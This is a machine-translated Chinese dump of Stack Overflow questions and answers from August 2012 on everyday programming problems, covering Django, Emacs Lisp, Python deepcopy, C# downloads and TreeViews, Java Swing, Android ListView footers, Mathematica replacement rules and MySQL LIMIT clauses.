这不起作用，它给了我一个 self.instance.employee.partners.all() 为空的错误。我认为这与表格无界有关，我不确定如何解决问题。这与我在每次保存后尝试过滤合作伙伴选择时遇到的问题相同，因此当您尝试添加新员工角色时，您只会看到您没有的合作伙伴。如果有人可以提出解决该错误的方法，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:43:05.247

你可以[`unique_together`](https://docs.djangoproject.com/en/1.3/ref/models/options/#unique-together)在你的模型中使用：

```
class EmployeeRoles(models.Model):
      partner = model.ForeignKey(Partner, relative_name='employee')
      employee = model.ForeignKey(Employee, relative_name='partner')

      class Meta:
          unique_together = (("partner", "employee"),) 
```

# emacs - emacs 制作帧切换缓冲区

> ID：12014036
> 
> 赞同：1
> 
> 时间：2012-08-17T22:33:12.710
> 
> 标签：emacs

我想在 emacs 中创建一个函数，该函数将创建一个新帧，然后在该新帧中获取缓冲区列表。我试过这个：

```
(defun get-buffer-menu-in-new-frame (arg)
(make-frame)
(switch-to-buffer-other-frame ( list-buffers))) 
```

我在 init.el 工作。我添加了这个来称呼它：

```
(get-buffer-menu-in-new-frame) 
```

然后我运行“eval-buffer”。这似乎奏效了：我得到了新框架，其中包含缓冲区列表（我希望这个结果不是巧合。

但后来我尝试了这个：

```
(global-set-key (kbd "<f4>") 'get-buffer-menu-in-new-frame) 
```

然后我按了function4键，但我得到了：

```
recursive-edit: Wrong type argument: commandp, get-buffer-menu-in-new-frame 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T22:38:14.523

您需要使用`interactive`.

```
(defun get-buffer-menu-in-new-frame ()
  (interactive)
  (switch-to-buffer-other-frame (list-buffers-noselect))) 
```

我还删除了未使用的 arg。

# xcode - Xcode 上的游戏分数编译问题

> ID：12014037
> 
> 赞同：0
> 
> 时间：2012-08-17T22:33:25.773
> 
> 标签：xcode, scoring

我在为拳击比赛编制分数时遇到问题。

每次主角击倒对手，**分数都会重置为0**，我希望**分数一直累积到拳击比赛结束**。

这是逻辑：

**-KO：2次击倒，比赛结束**

**-TKO：3 次击倒，比赛结束**

有什么想法可以解决这个问题吗？

这是我正在使用的代码：

```
-(void) setScore:(NSInteger)setscore withResetToZero:(BOOL) isReset {
    if (isReset) {
        score = setscore;
    }else {
        score =score + setscore;
    }
    DebugLog(@"Score is :%d",score );
} 
```

谢谢！

# c# - 存储 TreeView 节点以进行过滤

> ID：12014039
> 
> 赞同：0
> 
> 时间：2012-08-17T22:33:38.807
> 
> 标签：c#, treeview

`DataGridView`我以前`TreeView`用`TextBox`. 我有很多节点。

目前，这有效，但它是一个“仅删除”功能，如果我从`textBox`. 提前致谢。

```
//Change in text will hide non matching nodes (remove only)
for (int i = 0; i<dirTree.Nodes.Count; i++)
{
    if(!dirTree.Nodes[i].Text.Contains(custNameTB.Text))
    {
       dirTree.Nodes.RemoveAt(i);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:23:16.370

也许在内存中保留一个所有节点作为子节点的“主”节点。如果没有搜索文本，则只需将其添加到树视图中。然后，如果输入了搜索文本，则通过“主”节点并使用它来创建另一个过滤节点（将所需节点作为子节点）并将其添加到树视图中。

基本上你只是在节点上创建 2 个集合。我拥有所有节点（永久）和另一个只有所需节点的副本（临时）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:01:00.773

你不能让你的节点不可见（你必须添加/删除它）为什么因为如何让一个节点可见而他的子节点可见它会很困难（想象十个嵌套节点与 5 不行..）另一个解决方案是存储您的树视图（在树视图中您设置为不可见或在数据表中但更复杂）并有一个树视图要显示，因此如果您删除节点，它仅在重复的树视图上（不可见的树视图将保留并且您不会丢失节点）

# python - Python 多重深拷贝行为

> ID：12014042
> 
> 赞同：2
> 
> 时间：2012-08-17T22:34:12.500
> 
> 标签：python, deep-copy

假设我有两个类，例如`Manager`和`Graph`，其中每个 Graph 都有对其管理器的引用，并且每个管理器都有对其拥有的图形集合的引用。我希望能够做两件事

1) 复制一个图，它执行深度复制，除了新图引用与旧图相同的管理器。

2) 复制一个管理器，它会创建一个新的管理器并复制它拥有的所有图表。

做这个的最好方式是什么？我不想推出我自己的 deepcopy 实现，但标准`copy.deepcopy`似乎没有提供这种级别的灵活性。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T22:48:14.977

您可以通过查看`memodict`传递给`__deepcopy__`特殊方法的方法轻松做到这一点：

```
class Graph(object):
    def __init__(self, manager=None):
        self.manager = None if manager is None else weakref.ref(manager)
    def __deepcopy__(self, memodict):
        manager = self.manager()
        return Graph(memodict.get(id(manager), manager))

class Manager(object):
    def __init__(self, graphs=[]):
        self.graphs = graphs
        for g in self.graphs:
            g.manager = weakref.ref(self) 
```

我在这里假设您`weakref.ref`用来打破和之间的`Graph`循环`Manager`；如果您正在使用其他东西，请根据需要进行调整。

```
>>> m = Manager([Graph(), Graph()])
>>> mc = copy.deepcopy(m)
>>> [g.manager() is mc for g in mc.graphs]
[True, True]
>>> copy.deepcopy(m.graphs[0]).manager() is m
True 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:40:04.587

如果图中没有引用其他对象（只是简单的字段），则`copy.copy(graph)`应该进行复制，同时`copy.deepcopy(manager)`应该复制管理器及其图，假设有一个列表，例如`manager.graphs`.

但总的来说，您是对的，该`copy`模块没有这种灵活性，对于稍微花哨的情况，您可能需要自己动手。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:05:48.457

像定义类的复制协议这样非常简单的事情呢？

```
import copy

class Graph(object):

    def __init__(self):
        self.data = [1,2,3]
        self.manager = None

    def __getstate__(self):
        return {
            'data': self.data,
            'manager': self.manager
        }

    def __setstate__(self, state):
        self.manager = state.pop('manager')
        for name, val in state.iteritems():
            setattr(self, name, copy.copy(val))

class Manager(object):

    def __init__(self):
        self.data = [4,5,6]
        self.graphs = []

    def __getstate__(self):
        return {
            'data': self.data,
            'graphs': self.graphs
        }

    def __setstate__(self, state):
        self.graphs = [copy.copy(g) for g in state.pop('graphs')]
        for name, val in state.iteritems():
            setattr(self, name, copy.copy(val)) 
```

您只需将经理定义为参考，其他所有内容都可以按照您想要的方式进行复制。

例子：

```
In [2]: m1 = Manager()

In [3]: g1 = Graph()

In [4]: g1.manager = m1

In [5]: g2 = copy.copy(g1)

In [6]: g2.manager is g1.manager
Out[6]: True

In [7]: g2.data is g1.data
Out[7]: False

In [8]: m1.graphs.extend([g1,g2])

In [9]: m2 = copy.copy(m1)

In [10]: m2.data is m1.data
Out[10]: False

In [11]: m2.graphs[0] is m1.graphs[0]
Out[11]: False

In [12]: m2.graphs[0].manager is m1.graphs[0].manager
Out[12]: True 
```

# php - 更改服务器，并得到 SyntaxError: JSON.parse: unexpected character parsererror

> ID：12014045
> 
> 赞同：1
> 
> 时间：2012-08-17T22:34:39.650
> 
> 标签：php, parsing, syntax-error, json

我正在将 php 代码从一台 linux 服务器移动到另一台，而新的服务器正在产生垃圾。

在 Firebug 中，第一个结果看起来很棒，就像普通的 json 编码值一样，并且可以正常工作。

第二个结果（新服务器）前面是“html”和“body”标签，一个“p”标签，然后是“quot;” 而不是数据周围的实际引号（对不起，我无法让表单显示所有这些），并引发错误。

在这两种情况下，代码都是一样的，通过 json_encode 输出一个数组。

这可能是配置错误吗？

提前致谢。

约翰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T18:47:41.330

好吧，最终我添加了 header('Content-type: application/json'); 它删除了编码的html。我很想知道为什么我必须这样做。

# list - Mathematica 中的规则行为和初始列表的长度

> ID：12014047
> 
> 赞同：2
> 
> 时间：2012-08-17T22:35:02.747
> 
> 标签：list, wolfram-mathematica, rules

考虑以下：

```
 rule={x_, y_} -> {y, x};

    {{a, b}, {c, d}, {e, f}} /. rule
    {{a, b}, {c, d}} /. rule
    {{a, b}} /. {x_, y_} -> rule 
```

输出是：

```
{{b, a}, {d, c}, {f, e}}
{{c, d}, {a, b}}
{{b, a}} 
```

然而，假设初始列表的长度是未知的。我应该如何重写我的规则，以便子列表中的各个元素被反转，无论输入列表的长度如何，即当长度为 2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T08:43:30.237

首先应该注意的是，这个特定的操作最好用`Reverse[x, {2}]`：

```
Reverse[{{a, b}, {c, d}, {e, f}}, {2}] 
```

> ```
> {{b, a}, {d, c}, {f, e}} 
> ```

也就是说，对于替换规则，您应该使用`Replace`levelspec *（*第三个参数）而不是`ReplaceAll`，或者限制您的模式，使其仅匹配您想要的元素。（此外，请记住在使用命名模式时使用`:>`而不是`->`正确定位这些符号。）

```
Replace[{{a, b}, {c, d}}, {x_, y_} :> {y, x}, {1}] 
```

> ```
> {{b, a}, {d, c}} 
> ```

适用于您的样本的受限模式`/.`示例：

```
{{a, b}, {c, d}} /. {x : Except[_List], y_} :> {y, x}

{{a, b}, {c, d}} /. {x_Symbol, y_} :> {y, x}

{{a, b}, {c, d}} /. {x_, y_?AtomQ} :> {y, x} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T06:20:08.067

这是一种递归方式：

```
ClearAll[rule1]

rule1 = {z_, y___} :> {z /. x_List :> Reverse[x], Sequence @@ ({y} /. rule1)} 
```

结果：

```
{{1, 2, 3}, 2, {1, {2, 3}}, 4, head[x]} /. rule1

Out[]= {{3, 2, 1}, 2, {{2, 3}, 1}, 4, head[x]} 
```

尽管您也可以这样做：

```
ClearAll[rule2]

rule2 = x_List :> (# /. z_List :> Reverse[z] &) /@ x 
```

或者，只是

```
rule3 = x_List :> Reverse /@ x 
```

如果您事先知道列表中的所有元素都是列表，也可以正常工作。

# c# - DownloadFileAsync 不下载文件但已触发完成事件？

> ID：12014048
> 
> 赞同：0
> 
> 时间：2012-08-17T22:35:11.890
> 
> 标签：c#, webclient, downloadfileasync

好吧，我在这里不知所措。我正在尝试下载一个 jar 文件，然后制作一个运行它的批处理文件。我以前可以用我的代码下载这个文件一次，但现在完成的事件触发（我认为，因为它里面的代码运行。对不起，我是 C# 的新手。）但没有下载文件。我添加了一个只有下载代码的新按钮，文件在那里，但它只是显示为 0KB。我当前的代码甚至没有出现在 Fiddler 中。我使用 IP 地址跳过 DNS 检查，并将代理设置为空。（我在某处读到这样做会阻止它挂起。我想。这是关于网络代理自动检测的东西。）我可以验证下载链接（除非你需要它，否则我不会在这里显示）是真实的并且只需在网络浏览器中打开文件即可下载文件。反正，

```
 WebClient wc1 = new WebClient();
        wc1.DownloadFileCompleted += new AsyncCompletedEventHandler(wc1_DownloadFileCompleted);
        wc1.DownloadProgressChanged += new DownloadProgressChangedEventHandler(wc1_DownloadProgressChanged);

        if (cmboboxVersion.SelectedText == ...)
        {
            stsprgsbar.Style = ProgressBarStyle.Continuous;

            stslblStaus.Text = "Downloading files...";

            wc1.DownloadFileAsync(new Uri(...), @txtboxFolder.Text + "\\jarfile.jar");

            FileStream fs = new FileStream(@txtboxFolder.Text + "\\batfile.bat", FileMode.Create, FileAccess.ReadWrite);

            StreamWriter sw = new StreamWriter(fs);
            sw.WriteLine(...);
            sw.Close();

            fs.Close();

        }
        else if (cmboboxVersion.SelectedText == ...)
        {
            stsprgsbar.Style = ProgressBarStyle.Continuous;

            stslblStaus.Text = "Downloading files...";

            wc1.DownloadFileAsync(new Uri(...), @txtboxFolder.Text + "\\jarfile.jar");

            FileStream fs = new FileStream(@txtboxFolder.Text + "\\batfile.bat", FileMode.Create, FileAccess.ReadWrite);

            StreamWriter sw = new StreamWriter(fs);
            sw.WriteLine(...);
            sw.Close();

            fs.Close();
        }
        else
        {
            stsprgsbar.Style = ProgressBarStyle.Continuous;

            stslblStaus.Text = "Downloading files...";

            wc1.DownloadFileAsync(new Uri(...), @txtboxFolder.Text + "\\jarfile.jar");

            FileStream fs = new FileStream(@txtboxFolder.Text + "\\batfile.bat", FileMode.Create, FileAccess.ReadWrite);

            StreamWriter sw = new StreamWriter(fs);
            sw.WriteLine(...);
            sw.Close();

            fs.Close();
        }
    }

    public void wc1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
    {
        stsprgsbar.Value = e.ProgressPercentage;
    }

    public void wc1_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
    {
        string BatPath = @txtboxFolder.Text + "\\batfile.bat";
        stsprgsbar.Style = ProgressBarStyle.Marquee;
        stslblStaus.Text = "Generating files...";
        ProcessStartInfo pro = new ProcessStartInfo(BatPath);
        //pro.CreateNoWindow = true;
        Process.Start(pro);

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:40:47.710

```
wc1.DownloadFileAsync(new Uri(...), @txtboxFolder.Text + "\\jarfile.jar", @"c:\jarfile.jar");); 
```

# javascript - 用于确保 JSON 对象在传输过程中不会损坏的 Python-Javascript 哈希库

> ID：12014050
> 
> 赞同：1
> 
> 时间：2012-08-17T22:35:30.117
> 
> 标签：javascript, python, hash, corruption, validation

是否有可用的库可以帮助确保在运行 Python 的服务器和 Javascript 客户端之间来回发送的 JSON 对象没有损坏？

我认为它可能会通过创建对象的哈希值来与对象一起发送。然后对象的接收者可以重新散列对象并确保它与它收到的散列匹配。

这是我什至应该关注的事情，还是浏览器和客户端通常在幕后处理的事情？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:41:15.303

TCP 具有内置的错误检查功能，大多数链路层网络协议也是如此。因此，每个链接和端到端检查都在进行。唯一不能防止的是故意修改数据，例如防火墙、代理或网络黑客。但是，它们可以修改散列以及 JSON，因此添加散列并不能保护它们。如果您需要真正的、安全的保护，您需要使用加密技术，例如 SSL。

# eclipse - 如何设置 Eclipse 以构建多项目应用程序？

> ID：12014055
> 
> 赞同：0
> 
> 时间：2012-08-17T22:36:55.417
> 
> 标签：eclipse, apk, projects

我有一个包含 6 个项目的工作区。除主要项目外，所有项目都标记为库。

我需要配置主项目以在没有构建路径错误的情况下构建，并将其他 5 个的 jar 包含在 apk 中。

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:42:02.883

如果您希望生成一个包含其他库的运行时 jar，我建议您查看 maven 来管理您的依赖项和构建。

# java - JScrollPane 在应该垂直滚动时水平滚动

> ID：12014056
> 
> 赞同：1
> 
> 时间：2012-08-17T22:37:06.043
> 
> 标签：java, swing, jscrollpane

我有一个指定了 FlowLayout 的面板，其中充满了标签、文本字段和文本区域。框架不是那么宽，但是由于内部的所有组件，面板变得很高。我想将面板添加到 JScrollPane，这样我就可以在面板中垂直滚动。但是，当我将面板添加到滚动窗格并将滚动窗格添加到框架时，所有组件都彼此相邻并且水平滚动通过它们。这是代码：

```
public class Form {

    JTextField jtfName = new JTextField(15);
    JTextField jtfTitle = new JTextField(15);
    JTextField jtfAuthor = new JTextField(15);

    JTextArea jtaSetting = new JTextArea(5, 15);
    JTextArea jtaMainChars = new JTextArea(5, 15);
    JTextArea jtaConflict = new JTextArea(5, 15);
    JTextArea jtaQuote = new JTextArea(5, 15);
    JTextArea jtaMainCharShows = new JTextArea(5, 15);

    JPanel jpnlName = new JPanel();
    JPanel jpnlTitle = new JPanel();
    JPanel jpnlAuthor = new JPanel();

    Form() {

        // Create a new JFrame container.
        JFrame jfrm = new JFrame("Organizer");

        jfrm.setLayout(new GridLayout(0,1));

        // Give the frame an initial size.
        jfrm.setSize(300, 300);

        // Terminate the program when the user closes the application.
        jfrm.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Create a panel.
        JPanel jpnl = new JPanel();

        // Create labels.
        JLabel jlabName = new JLabel("Student Name:");
        JLabel jlabTitle = new JLabel("Title:");
        JLabel jlabAuthor = new JLabel("Author:");

        JLabel jlabSetting = new JLabel("Setting (Time and Place):");
        jlabSetting.setHorizontalAlignment(SwingUtilities.CENTER);

        JLabel jlabMainChars = new JLabel("Main Characters:");
        jlabMainChars.setHorizontalAlignment(SwingUtilities.CENTER);

        JLabel jlabConflict = new JLabel("<html>Describe the major conflict of the<br>story in one well-written sentence:");
        jlabConflict.setHorizontalAlignment(SwingUtilities.CENTER);

        JLabel jlabQuote = new JLabel("<html>Find and write down a passage (quote<br>from the book that reveals a significant<br>personality trait of one of the main characters<br>and GIVE THE PAGE #:");
        jlabQuote.setHorizontalAlignment(SwingUtilities.CENTER);

        JLabel jlabMainCharShows = new JLabel("<html>Explain in your own words what the<br>passage (quote) shows about the main character.");
        jlabMainCharShows.setHorizontalAlignment(SwingUtilities.CENTER);

        // Add text fields to panel.
        jpnlName.add(jlabName);
        jpnlName.add(jtfName);

        jpnlTitle.add(jlabTitle);
        jpnlTitle.add(jtfTitle);

        jpnlAuthor.add(jlabAuthor);
        jpnlAuthor.add(jtfAuthor);

        // Add components to main panel.
        jpnl.add(jpnlName);
        jpnl.add(jpnlTitle);
        jpnl.add(jpnlAuthor);
        jpnl.add(jlabSetting);
        jpnl.add(jtaSetting);
        jpnl.add(jlabMainChars);
        jpnl.add(jtaMainChars);
        jpnl.add(jlabConflict);
        jpnl.add(jtaConflict);
        jpnl.add(jlabQuote);
        jpnl.add(jtaQuote);
        jpnl.add(jlabMainCharShows);
        jpnl.add(jtaMainCharShows);

        // Add the panel to a scroll pane.
        JScrollPane jspPanel = new JScrollPane(jpnl);

        // Add the scroll pane to the frame.
        jfrm.getContentPane().add(jspPanel);

        // Display the frame.
        jfrm.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T22:59:01.747

在不确切知道您想要的布局的情况下，我可以建议的最佳解决方案是尝试[WrapLayout](http://tips4java.wordpress.com/2008/11/06/wrap-layout/)

它解决了 的主要问题`FlowLayout`，它不换行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:26:16.103

你为什么不试试 BoxLayout：

```
jpnl.setLayout(new BoxLayout(jpnl, BoxLayout.PAGE_AXIS)); 
```

# iphone - 关闭uiimagepickerviewcontroller后如何使状态栏重新出现

> ID：12014058
> 
> 赞同：2
> 
> 时间：2012-08-17T22:37:22.970
> 
> 标签：iphone, objective-c, ios, cocoa-touch

当我以模态方式展示我的 uiimagepickerviewcontroller 时，我在我的应用程序中隐藏了状态栏。

```
[[UIApplication sharedApplication] setStatusBarHidden:YES withAnimation:UIStatusBarAnimationFade]; 
```

在回调方法中：

```
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info 
```

我执行以下方法：

```
[[UIApplication sharedApplication] setStatusBarHidden:NO withAnimation:UIStatusBarAnimationNone];
[[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleBlackTranslucent animated:YES]; 
```

打电话之前：

```
[picker dismissViewControllerAnimated:YES completion:^() {}]; 
```

我尝试在完成块中“显示”状态栏无济于事。关闭 uiimagepickerviewcontroller 后，我应该如何让状态栏重新出现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:53:11.080

尝试将其放回视图控制器解除完成处理程序：

```
[picker dismissViewControllerAnimated:YES completion:^(BOOL done){
    [[UIApplication sharedApplication] setStatusBarHidden:NO withAnimation:UIStatusBarAnimationNone];
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleBlackTranslucent animated:YES];
}]; 
```

虽然这很奇怪，但没有任何理由说明为什么这对我不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-28T08:58:44.900

我在 iOS 11 中遇到了同样的问题。我可以通过以下方式使 statusBar 重新出现：

在`Info.plist`中，设置`View controller-based status bar appearance`为`YES`：

[![在此处输入图像描述](../Images/14d2b55d7f2935ca34cbc7050984c495.png)](https://i.stack.imgur.com/VWbju.png)

在呈现的视图控制器中`UIImagePickerController`，实现

```
- (BOOL)prefersStatusBarHidden {
    return NO;
} 
```

# javascript - MVC 3 razor view 的文件上传下载能力查看附件图片

> ID：12014064
> 
> 赞同：0
> 
> 时间：2012-08-17T22:38:06.680
> 
> 标签：javascript, jquery, asp.net-mvc, jquery-ui, razor

在 MVC 3 razor view 应用程序的文件上传和下载功能方面，我需要您的帮助。

![在此处输入图像描述](../Images/713c35177068e1addc1e898c3e3f7a2a.png)

以上是我希望能够将文件添加到我提交到数据库的表单的方式。我可以管理后端部分、SQL/存储过程等......但视图是主要问题。

我不是一个脚本专家，所以我需要你的指导才能做到这一点。

我希望能够像上面的“附加另一个文件”一样单击链接并弹出对话框文件选择（我已经完成了这部分，但如果您有更好的想法，请告诉我）。

我选择的每个文件我都想查看，就像上面的图片一样，左侧有一个复选框.. 并且应该能够选择任意数量的文件。

完成后，在提交或上传时，我希望能够上传它们，或者如果未选中不加载它们..

谢谢各位！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T15:35:59.557

您可以使用 jquery 插件。

[http://www.fyneworks.com/jquery/multiple-file-upload/](http://www.fyneworks.com/jquery/multiple-file-upload/)

它不使用闪光灯。我对任何浏览器都没有问题。适用于所有浏览器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:46:30.083

如果你输入谷歌“Ajax multi file upload in asp.net mvc”，第一个结果会给你答案

[http://valums.com/ajax-upload/](http://valums.com/ajax-upload/)

5分钟写完太复杂了，有一百万个库，你必须选择一个，我确定有一个可用的槽nuget

[http://nuget.org/packages/FreshUpload](http://nuget.org/packages/FreshUpload)

整洁的 ：）

# java - 不需要的空值替换

> ID：12014067
> 
> 赞同：0
> 
> 时间：2012-08-17T22:38:28.663
> 
> 标签：java

我正在研究英语到莫尔斯语的翻译器。当我用英语输入我的句子时，我收到一个充满“空”而不是相应的莫尔斯字符的翻译。

结果如下所示：“null|null|null|null|null”。`|`是莫尔斯字符的分隔符。我如何摆脱空值？这是我的代码：

（是的，这是家庭作业。）

```
import javax.swing.JOptionPane;

public class test
{
public static void main ( String [] args )
{
    String s1 = "Morse";

    //Decide whether Morse code or English
    String decide = JOptionPane.showInputDialog("Enter 'English' for Morse to English code translation and 'Morse' for English to Morse code translation. Pay attention to Caps.");

    //Enter String
    String phrasep = JOptionPane.showInputDialog("Enter the words you wish to translate.");

    if ( decide.equals( s1 ))
        toMorse( phrasep );
    else
        toEnglish( phrasep );
}

// Translate to Morse
public static void toMorse( String phrase1 )
{
    char[] english = new char[36];

    for (  int i = 65, j = 0; i < 91; i++, j++) {
        english[j] = (char)i;
    }

    english[26] = 1;
    english[27] = 2;
    english[28] = 3;
    english[29] = 4;
    english[30] = 5;
    english[31] = 6;
    english[32] = 7;
    english[33] = 8;
    english[34] = 9;
    english[35] = 0;

    String[] morse = {".-","-...","-.-.","-..",".","..-.","--.","....","..", ".---",
            "-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-","..-", 
            "...-",".--","-..-","-.--","--.."};

    //Replace spaces with |
    String phrase = phrase1.replace( "//s+", "|");

    String[] translation = new String[phrase1.length()];

    //Translate
    for ( int j = 0, t = 0, n = 1; j < phrase.length(); j++) {
        if ( phrase.substring(t, n ).equals ( english[j] ) ) {
            translation[t] = morse[j];
            t++;
            n++;
        }
    }

    String separatorp = new String( "|" );
    arrayToString ( translation, separatorp );
}

public static void toEnglish( String phrase) {
    System.out.println( phrase );
}

//Convert array to string and print translation
public static void arrayToString(String[] trans, String separator) 
{
    String result = "";
    if (trans.length > 0) {
            result = trans[0];    // start with the first element
            for (int i = 1; i < trans.length; i++)
                    result = result + separator + trans[i];
        }
    System.out.println ( result );
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T22:59:13.867

关于如何编写这个程序存在很大的困惑。让我们考虑一下您的核心功能：

```
public static String toMorse(String english) { ... } 
```

与您的实现不同，请注意它返回一个字符串。这是因为您给它一个字符串（英语短语），而您想要返回另一个字符串（莫尔斯短语）。始终首先考虑您的数据是什么，然后在该数据上编写函数。不要写函数，想想你的数据是什么。

现在考虑实现此功能的基本部分，您的版本在这里：

```
//Translate
for ( int j = 0, t = 0, n = 1; j < phrase.length(); j++) {
    if ( phrase.substring(t, n ).equals ( english[j] ) ) {
        translation[t] = morse[j];
        t++;
        n++;
    }
} 
```

首先，你为什么要实例化三个你没有命名的变量（所以他们的意思对于第一次看它的人来说是不清楚的）并且你以同步方式增加它们？以下做同样的事情：

```
//Translate
for ( int j = 0, t=0; j < phrase.length(); j++) {
    if ( phrase.substring(t, (t+1) ).equals ( english[j] ) ) {
        translation[t] = morse[j];
        t++;
    }
} 
```

但目前还不清楚从名字上是做什么`j`和做什么的。`t`当您进行逐个字符的转换时，您实际上是在将它们用作索引。如果我们[查看 Java String API](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html)，我们会看到您正在使用 substring() 来获取特定字符...除了您的起点和终点是`j`and `j+1`，这意味着您将始终获得两个字符。两个字符永远不会匹配一个字符。

上面链接的文档显示了检索字符的另一个选项。

当我们这样做时，请注意：

*   如果您遵循良好的编程风格，您的分隔符应该存储为常量，而不是硬编码到您的函数中。
*   在一个地方，您`replace()`用来用另一个地方替换特定事物的实例。其次，您正在详尽地遍历一个 n 长度的列表以寻找特定的匹配项。使用一种方法或另一种方法。在这里使用两者都是不合适的并且令人困惑。
*   您的翻译时间为 O(n*m)，其中 n 是短语的长度，m 是字母表中的字母数。通常这将被认为是 O(n^2)，这是不好的。[Map](http://docs.oracle.com/javase/6/docs/api/java/util/Map.html)确实是您想要的，因为它是 O(1) 访问时间，将您的函数减少到 O(n)，其中 n 是您的短语的长度。
*   您的变量需要明确命名，以便您清楚地知道它们的作用。命名它们的行为将迫使你直截了当地记住它们的意思。
*   您应该在您使用它们的功能之外设置您的字典。这样您就可以独立于您的翻译功能检查它们的正确性。

我最后的建议是，你可以远离代码，尝试用简单的英语写出进行这种转换的说明。您似乎对阻止您解决手头问题的细节（例如将文本粘贴到摇摆前端）感到困惑：如何正确地将短语从一种语言翻译成另一种语言。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T22:55:12.110

Add some "System.out.println" will help you to understand what's wrong in your code. Please focus on:

```
for ( int j = 0, t = 0, n = 1; j < phrase.length(); j++)
{

    if ( phrase.substring(t, n ).equals ( english[j] ) )
    {
        translation[t] = morse[j];
        // Try add one line:
        System.out.println(translation[t];
        t++;
        n++;
    }
} 
```

By the way, do you use eclipse or NetBeans, etc? If not, you probably learn one of them.

# android - 不在 ListView 中使用页脚会更好吗？

> ID：12014070
> 
> 赞同：-1
> 
> 时间：2012-08-17T22:38:53.063
> 
> 标签：android

在列表视图中添加/删除和定位页脚有什么好处？在ListView下方的区域显示不是更好吗？动态添加/删除页脚可能会发生错误。此外，在添加时出现（如果我错了，请纠正我），每次添加页脚时都需要重置适配器。

这是我最终用于将页脚视图添加到列表视图的方法，它显示了添加/删除的内容。

```
 private void addFooterView(ListView listView, View footerView)
{
    if ((listView != null) && (footerView != null))
    {
        listView.removeFooterView(footerView);
        listView.addFooterView(footerView);
        if (listView.getAdapter() != null)
        {

           listView.setAdapter(mInTheatersMostPopularAdapter);
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:34:00.637

如果列表视图已经有一个适配器，如果您尝试添加页眉或页脚视图（“固定”视图），它将引发异常（我认为是非法状态）。这是因为如果在设置适配器时列表具有固定视图，它会将您的适配器包装在 HeaderViewListAdapter 中。

如果要动态更改列表视图中的页脚，则需要取消当前适配器添加固定视图，然后重置适配器。如果您没有对您的适配器的引用，您可以从列表视图中获取它，但请检查它是否是 HeaderViewListAdapter。如果是，请在其上调用 getWrappedAdapter 并将其保留为局部变量，同时按顺序 setAdapter(null)、addFooterView(footer)、setAdapter(oldAdapterHere)。

您可以通过操纵驱动适配器的数据并让它处理不同的视图类型来模拟页眉和页脚。页眉和页脚视图在您在屏幕上下滚动时不会被回收，因此需要考虑性能 - 它们总是会占用全部内存，但您不会每次都重新填充、布局、膨胀等。

# c# - 构建运行时许可证未显示为选项

> ID：12014075
> 
> 赞同：1
> 
> 时间：2012-08-17T22:40:24.553
> 
> 标签：c#, visual-studio, sql-server-2005, visual-studio-2008, licenses.licx

我有一个 VS 2008 项目。我将 licenses.licx 项目添加到根目录，但是当我右键单击它时，我看不到“构建运行时许可证”。我错过了什么？

# php - php脚本中的Mysql

> ID：12014077
> 
> 赞同：0
> 
> 时间：2012-08-17T22:40:31.433
> 
> 标签：php, mysql

这是我的 php 脚本：

```
$result = select_query( "tblusers",
                        "users,status,active",
                        "country='norway' AND (status='active' OR status='cancelled')" ); 
```

这将返回所有结果。如果我当时只想列出 20 个，我该怎么做？

我应该使用`count`函数还是`limit`函数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T22:41:59.750

添加限制：

```
$result = select_query("tblusers","users,status,active","country='norway' AND (status='active' OR status='cancelled') LIMIT 0,20"); 
```

最好使用**PDO/MySqli**而不是**Mysql**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T22:42:53.930

我不确定你的`select_query()`函数是如何定义的——它不是内置的 PHP 方法。不过，它可能有一个可选参数来允许限制，您可能想研究一下。

但是，要附加到现有代码中，您可以`WHERE`使用作为第三个参数传递的子句[`LIMIT`](http://dev.mysql.com/doc/refman/5.0/en/select.html)：

```
$result = select_query(
           "tblusers",
           "users,status,active",
           "country='norway' AND (status='active' OR status='cancelled') LIMIT 20"
          ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T22:49:58.270

请记住 LIMIT 并不是所有 sql 的标准

```
$result = select_query("tblusers",
    "users,status,active",
    "country='norway' AND (status='active' OR status='cancelled') 
          LIMIT 0,20"
); 
```

# ruby-on-rails - Rails 3：允许用户使用基本 HTML 标签

> ID：12014084
> 
> 赞同：1
> 
> 时间：2012-08-17T22:41:15.637
> 
> 标签：ruby-on-rails, ruby-on-rails-3, xss, html-safe

